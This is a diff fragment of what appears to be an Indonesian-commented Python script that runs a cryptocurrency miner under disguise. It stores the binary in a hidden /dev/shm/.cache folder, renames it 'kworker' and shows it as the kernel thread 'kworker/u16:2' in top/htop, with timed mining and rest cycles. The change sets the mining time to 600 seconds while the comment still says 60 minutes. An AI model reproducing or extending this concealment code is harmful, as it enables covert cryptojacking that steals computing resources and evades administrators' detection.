@@ -7,7 +7,7 @@ import signal
 MINER_PATH = "/dev/shm/.cache/poppy"  # Lokasi miner asli
 FAKE_PATH = "/dev/shm/.cache/kworker"  # Nama samaran
 FAKE_NAME = "kworker/u16:2"  # Nama proses di top/htop
-MINING_TIME = 3600  # 60 menit mining
+MINING_TIME = 600  # 60 menit mining
 REST_TIME = 600  # 10 menit istirahat
 
 # Buat symlink supaya miner punya nama lain
